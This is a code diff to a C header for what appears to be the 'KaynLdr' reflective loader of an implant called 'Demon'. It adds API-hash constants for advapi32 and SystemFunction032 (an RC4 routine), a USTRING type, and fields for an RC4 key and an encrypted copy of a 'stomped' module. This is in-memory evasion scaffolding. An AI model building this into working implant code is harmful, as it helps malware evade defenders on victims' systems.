@@ -14,6 +14,7 @@ VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWO
 
 #define PAGE_SIZE                       4096
 #define NTDLL_HASH                      0x70e61753
+#define ADVAPI32_HASH                   0x941cbee6
 #define STOMPED_HASH                    0xd2ad37e8
 #define SYS_LDRLOADDLL                  0x9e456a43
 #define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
@@ -21,6 +22,8 @@ VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWO
 #define H_FUNC_TPALLOCWORK              0x3fc58c37
 #define H_FUNC_TPRELEASEWORK            0x27a9ff4d
 #define H_FUNC_TPPOSTWORK               0x4d915ab2
+#define SYSTEMFUNCTION032               0xe58c8805
+#define KEYSIZE 4
 
 typedef struct {
     WORD offset :12;
@@ -36,9 +39,17 @@ typedef struct
 
 typedef struct
 {
+    DWORD	Length;
+    DWORD	MaximumLength;
+    PVOID	Buffer;
+} USTRING;
+
+typedef struct
+{
     struct
     {
         UINT_PTR Ntdll;
+        UINT_PTR Advapi32;
     } Modules;
 #ifdef _WIN64
     struct _LDRLOADDLL_ARGS {
@@ -81,6 +92,8 @@ typedef struct
                 PVOID           *DllHandle
         );
 
+        NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );
+
         NTSTATUS (NTAPI* TpAllocWork)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
 
         VOID (NTAPI* TpPostWork)(PTP_WORK);
@@ -115,10 +128,11 @@ typedef struct
 #endif
 } INSTANCE, *PINSTANCE;
 
+#pragma pack(1)
 typedef struct
 {
-    PVOID StompedAddress;
-    DWORD StompedSize;
+    USTRING KeyStompedModule;
+    USTRING Rc4StompedModule;
     PVOID KaynLdr;
     PVOID DllCopy;
     PVOID Demon;
